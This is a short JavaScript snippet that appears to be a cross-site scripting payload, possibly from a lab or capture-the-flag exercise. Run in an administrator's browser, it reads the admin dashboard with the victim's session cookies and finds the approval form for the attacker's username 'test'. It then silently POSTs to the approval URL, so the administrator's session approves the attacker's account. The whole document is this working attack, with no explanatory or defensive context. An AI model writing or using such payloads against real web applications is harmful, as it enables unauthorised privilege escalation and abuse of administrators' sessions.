(async () => {
     try {
       const html = await (
         await fetch("/admin/dashboard", { credentials: "include" })
       ).text();
       // Find the approval form for the attacker username
       // Naive parse: search for your username, then the nearby action URL
       const uname = "test";
       const idx = html.indexOf(uname);
       if (idx === -1) return;
       const around = html.slice(idx, idx + 2000);
       const m = around.match(/action="(\/admin\/approve\/[a-f0-9\-]+)"/i);
       if (!m) return;
       await fetch(m[1], { method: "POST", credentials: "include" });
     } catch (e) {}
   })();
